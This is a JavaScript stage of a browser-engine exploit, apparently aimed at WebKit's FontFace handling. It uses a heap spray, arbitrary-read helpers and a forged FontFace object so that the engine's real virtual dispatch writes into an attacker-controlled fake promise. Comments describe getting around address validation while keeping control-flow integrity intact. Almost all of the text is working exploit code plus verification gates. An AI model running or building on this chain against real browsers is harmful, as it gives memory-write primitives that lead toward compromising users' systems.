// V38 Patch: THE COOP WRITE WITNESS — real dispatch, aimed promise
//
// CONTEXT: the address-validation wall is CONFIRMED (V36p RETURN vs V36R
// CRASH, byte-identical clone). The fake-vtable route is closed. But V36p
// proved the fully client-controlled FontFace head + the REAL vtable works:
// the real thunks run on OUR copied refcount, and the real fontStateChanged
// reads OUR m_backing and OUR m_loadedPromise. CFI intact, data-flow ours.
//
// V38 = V36p + ONE PATCH: the m_loadedPromise field in the head copy
// (C'+0x18 = S+0x88) aimed at a FORGED UNFULFILLED PROMISE at S+0xC0.
//
// THE MECHANISM (1400 FontFace.cpp:346-351 + DOMPromiseProxy.h:357-366):
//   fontStateChanged(Failure):
//     if (!m_loadedPromise->isFulfilled())      <- reads OUR forged optional -> FALSE
//       m_loadedPromise->reject(Exception{NetworkError});
//   reject():
//     m_valueOrException = ExceptionOr<void>{WTFMove(exception)};  <- WRITES into our buffer
//     auto deferredPromisesCopy = m_deferredPromises;               <- zeroed Vector -> empty, safe
//     for (auto& deferredPromise : deferredPromisesCopy) ...        <- empty loop
//
// THE FORGED PROMISE (S+0xC0..0x100, all zeros):
//   +0x00: m_resolveCallback (Function ptr = 0, never called)
//   +0x08..: the m_valueOrException optional (UNENGAGED -> isFulfilled false)
//   +0x20..: the deferred Vector {ptr=0, size=0, cap=0} -> empty copy
//
// SAFETY: isFulfilled reads 0 -> false; the ASSERT(!m_valueOrException)
// pre-state check passes (0); the deferred copy is empty; the write lands
// in OUR ArrayBuffer (writable). No fake vtable — the REAL VP stays at C'+0x00.
//
// WITNESS: the FORGE-WRITE diff (whole-S pre/post) shows the write at the
// forged promise region = THE ENGINE WRITE PRIMITIVE THROUGH THE REAL
// DISPATCH. Also: the real promise (at promiseAddr) stays UNCHANGED —
// proving the write went to OUR aimed target, not the real one.
//
// EXPECT: RETURN, status=4, opcount=1, rc-after=N (balanced ref/deref on
// the head), FORGE-WRITE showing bytes at S+0xC0+..., real promise UNCHANGED.

/* ==== V38: THE COOP WRITE WITNESS ==== */

try{
  if(MBUF>0n&&VP>0n&&bufs&&bufs.length>0&&fbRaw&&fbRaw.length>=128&&l2raw&&fbRaw.length>=128){
    var FSG=BASE+0x5B3D6B0n, NOPG=BASE+0x4001750n;
    var mIdx=-1;
    var tH=readAt(MBUF+0x48n,8); var tV=qAt(tH,0);
    if((tV>>32n)===0xAAn)mIdx=Number(tV&0xFFFFFFFFn);
    bs('V38-TAG-mIdx='+mIdx);

    if(mIdx>=0&&mIdx<32){
      var sv=new DataView(window.__v688.spray[mIdx]);
      var S=MBUF;
      var hitBuf=bufs[0][0];

      bs('V38-ARM=coop');

      /* ---- STEP 1: ALL readAt FIRST ---- */
      var promiseAddr=qAt(readAt(FB+0x18n,8),0);
      bs('V38-REAL-PROMISE-ADDR='+hex(promiseAddr));
      var promiseBefore=readAt(promiseAddr,0x30);
      bs('V38-REAL-PROMISE-BEFORE='+promiseBefore);

      /* THE HEAD READ: [FB-0x20, FB+0x28) = the complete object */
      var headH=readAt(FB-0x20n,0x48);
      bs('V38-HEAD='+headH);

      bs('V38-SIBLING-SCAN');
      var sib=0n, sibBk=0n;
      for(var sa=FB-0x2000n;sa<FB+0x2000n&&sib===0n;sa+=8n){
        var q0h=readAt(sa,8);
        if(qAt(q0h,0)===VP){
          var bkH=readAt(sa+0x10n,8);
          var bk=qAt(bkH,0);
          if(bk>0x1000000000n&&bk!==S&&bk!==FB&&bk!==self&&bk<0x10000000000n){sib=sa;sibBk=bk;}
        }
      }
      if(sibBk===0n){bs('V38-NO-SIBLING');verd('err','V38 no sibling');throw 'no sibling';}
      bs('V38-SIBLING='+hex(sib)+'-backing='+hex(sibBk));

      var timerH=readAt(sibBk+0x88n,0x38);
      bs('V38-TIMER-BORROWED='+timerH);

      /* ---- STEP 2: build the FORGE ---- */
      bs('V38-FORGE-BUILD');

      /* impl: L2 byte-copy, m_ptr = C' = S+0x70 */
      for(var ib=0;ib<0x20;ib++)sv.setUint8(ib,parseInt(l2raw.substr(ib*2,2),16));
      dvSetBig(sv,0x08,S+0x70n);
      bs('V38-IMPL-rc='+sv.getUint32(0x00,true)+'-m_ptr='+hex(dvGetBig(sv,0x08)));

      /* metadata + buckets (the proven ladder) */
      sv.setUint32(0x20,0,true); sv.setUint32(0x24,1,true);
      sv.setUint32(0x28,3,true); sv.setUint32(0x2C,4,true);
      dvSetBig(sv,0x30,S); dvSetBig(sv,0x38,0n); dvSetBig(sv,0x40,0n); dvSetBig(sv,0x48,0n);

      /* THE HEAD COPY: 0x48 bytes from [FB-0x20) -> S+0x50..0x98 */
      for(var hc=0;hc<0x48;hc++)sv.setUint8(0x50+hc,parseInt(headH.substr(hc*2,2),16));
      var headN=sv.getUint32(0x68,true);
      var headVptr=dvGetBig(sv,0x70);
      bs('V38-HEAD-rcN='+headN+'-vptr='+hex(headVptr));

      /* **** THE V38 PATCH: aim the promise at the forged one ****
       * C'+0x18 = S+0x88 = the m_loadedPromise field in the head copy.
       * Patch it: real promise ptr -> S+0xC0 (our forged promise). */
      var realPromiseCopied=dvGetBig(sv,0x88);
      bs('V38-PROMISE-ORIG='+hex(realPromiseCopied)+'-aiming='+hex(S+0xC0n));
      dvSetBig(sv,0x88,S+0xC0n);

      /* THE FORGED PROMISE at S+0xC0..0x100 (all zeros):
       * +0x00: m_resolveCallback (0)
       * +0x08..: m_valueOrException optional (UNENGAGED)
       * +0x20..: deferred Vector (empty) */
      for(var pz=0xC0;pz<0x100;pz++)sv.setUint8(pz,0);
      bs('V38-FORGE-PROMISE-ZEROED-at='+hex(S+0xC0n));

      bs('V38-FORGE-BUILT');

      var preA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));

      /* ---- STEP 3: craft the FACE (LAST; no readAt after) ---- */
      bs('V38-FACE-CRAFT');
      for(var sz=0x28;sz<=0x57;sz++)hitBuf[sz]=0;
      for(var c2=0x60;c2<=0x67;c2++)hitBuf[c2]=0;
      hitBuf[0x82]=0; hitBuf[0x83]=1; hitBuf[0x87]=1;
      for(var bl=0x84;bl<=0x89;bl++)hitBuf[bl]=1;
      for(var tb=0;tb<0x38;tb++)hitBuf[0x88+tb]=parseInt(timerH.substr(tb*2,2),16);
      for(var hz=0x98;hz<0xA8;hz++)hitBuf[hz]=0;
      for(var hz2=0xA8;hz2<0xB0;hz2++)hitBuf[hz2]=0;

      /* ---- STEP 4: install ---- */
      for(var hb=0;hb<8;hb++)hitBuf[0x58+hb]=Number(((S+0x30n)>>BigInt(hb*8))&0xFFn);

      /* ---- STEP 5: GATES ---- */
      var gatesOK=true;

      /* G1 metadata */
      var g1hex='';for(var g1=0;g1<16;g1++)g1hex+=('0'+sv.getUint8(0x20+g1).toString(16)).slice(-2);
      if(g1hex!=='00000000010000000300000004000000'){gatesOK=false;bs('V38-G1-FAIL');}
      else bs('V38-G1-meta-OK');

      /* G2 install */
      var g2=0n;for(var g2b=0;g2b<8;g2b++)g2|=BigInt(hitBuf[0x58+g2b])<<BigInt(g2b*8);
      if(g2!==(S+0x30n)){gatesOK=false;bs('V38-G2-FAIL');}else bs('V38-G2-install-OK');

      /* G3/G4 counters+sources */
      var g3ok=true,g4ok=true;
      for(var g3=0x60;g3<0x68;g3++)if(hitBuf[g3]!==0)g3ok=false;
      for(var g4=0x48;g4<0x58;g4++)if(hitBuf[g4]!==0)g4ok=false;
      if(!g3ok||!g4ok){gatesOK=false;bs('V38-G3G4-FAIL');}else bs('V38-G3G4-zero-OK');

      /* G5 status/timer */
      var g5v=0n;for(var q9=0;q9<8;q9++)g5v|=BigInt(hitBuf[0x90+q9])<<BigInt(q9*8);
      var g5t=0n;for(var q10=0;q10<8;q10++)g5t|=BigInt(hitBuf[0xB0+q10])<<BigInt(q10*8);
      if(!(hitBuf[0x82]===0&&hitBuf[0x87]===1&&g5v!==0n&&g5t!==0n)){gatesOK=false;bs('V38-G5-FAIL');}
      else bs('V38-G5-timer-OK');

      /* GH: the head gates */
      if(!(headN>=1)){gatesOK=false;bs('V38-GH-FAIL-rcN='+headN);}
      else bs('V38-GH-rcN='+headN+'-OK');
      var currentVptr=dvGetBig(sv,0x70);
      if(currentVptr!==VP){gatesOK=false;bs('V38-GH-FAIL-vptr='+hex(currentVptr));}
      else bs('V38-GH-vptr=REAL-VP-OK');

      /* GI: impl.m_ptr */
      if(dvGetBig(sv,0x08)!==(S+0x70n)){gatesOK=false;bs('V38-GI-FAIL');}
      else bs('V38-GI-impl-mptr-OK');

      /* GP: THE V38 GATE - the promise aimed + the forged region zeroed */
      var gPromise=dvGetBig(sv,0x88);
      if(gPromise!==(S+0xC0n)){gatesOK=false;bs('V38-GP-FAIL-promise='+hex(gPromise));}
      else bs('V38-GP-promise-aimed-OK');
      var gPz=true;
      for(var gp=0xC0;gp<0x100;gp++)if(sv.getUint8(gp)!==0)gPz=false;
      if(!gPz){gatesOK=false;bs('V38-GP-FAIL-forged-not-zero');}
      else bs('V38-GP-forged-zero-OK');

      if(!gatesOK){
        bs('V38-GATE-FAIL-ABORT-NO-LOAD');
        verd('err','V38 gate fail');
      }else{
        bs('V38-GATES-ALL-OK');

        /* ---- STEP 6: THE DISPATCH ---- */
        bs('V38-LOAD-PRE');
        var loadReturned=false;
        try{
          faces[zi].load();
          loadReturned=true;
          bs('V38-LOAD-RETURNED');
        }catch(e){
          bs('V38-LOAD-THREW-'+String(e&&e.message?e.message:'?'));
        }

        /* ---- STEP 7: THE WITNESS ---- */
        bs('V38-WIT-status='+hitBuf[0x82]+'-opcount='+(hitBuf[0x60]|(hitBuf[0x61]<<8))+'-rc-after='+sv.getUint32(0x68,true)+'-rc-before='+headN);
        try{bs('V38-JS-STATUS='+faces[zi].status);}catch(e){bs('V38-JS-STATUS-ERR');}

        /* THE FORGE-WRITE DIFF: the whole S buffer pre/post.
         * The write should appear at S+0xC0.. (the forged promise region). */
        var curA=new Uint8Array(window.__v688.spray[mIdx].slice(0,0x100));
        var diffs=[];
        for(var wq=0;wq<0x100;wq+=8){
          var cur=0n,old=0n;
          for(var wb=0;wb<8;wb++){
            cur|=BigInt(curA[wq+wb])<<BigInt(wb*8);
            old|=BigInt(preA[wq+wb])<<BigInt(wb*8);
          }
          if(cur!==old)diffs.push('@'+(S+BigInt(wq)).toString(16)+':'+old.toString(16)+'>'+cur.toString(16));
        }
        if(diffs.length){
          bs('WIT-V38-COOP-WRITE-'+diffs.join('|'));
          /* classify: any diff at S+0xC0.. = the promise write */
          var promiseWrite=false;
          for(var cw=0xC0;cw<0x100;cw++)if(curA[cw]!==preA[cw])promiseWrite=true;
          if(promiseWrite&&loadReturned){
            bs('V38-COOP-WRITE-CONFIRMED-engine-wrote-into-forged-promise');
            verd('ok','V38 THE COOP WRITE IS REAL');
          }
        }
        else bs('WIT-V38-FORGE-nowrite');

        /* THE REAL PROMISE: must stay UNCHANGED (the write went to OURS) */
        var promiseAfter=readAt(promiseAddr,0x30);
        if(promiseAfter!==promiseBefore)bs('WIT-V38-REAL-PROMISE-CHANGED-unexpected');
        else bs('WIT-V38-REAL-PROMISE-unchanged-OK');

        for(var rb=0;rb<8;rb++)hitBuf[0x58+rb]=Number((L1>>BigInt(rb*8))&0xFFn);
        bs('V38-RESTORED');

        if(loadReturned){
          verd('ok','V38 coop-witness '+(diffs.length?'WITH-WRITE':'no-write'));
          bs('V38-DONE-' +(diffs.length?'WRITE-WITNESSED':'nowrite'));
        }else{
          verd('err','V38 crashed');
          bs('V38-DONE-CRASHED');
        }
      }

    }else bs('V38-SKIP-bad-idx');
  }else bs('V38-SKIP-missing-data');
}catch(e38){bs('V38-ERR-'+String(e38&&e38.message?e38.message:'?'));}
/* ==== V38 END ==== */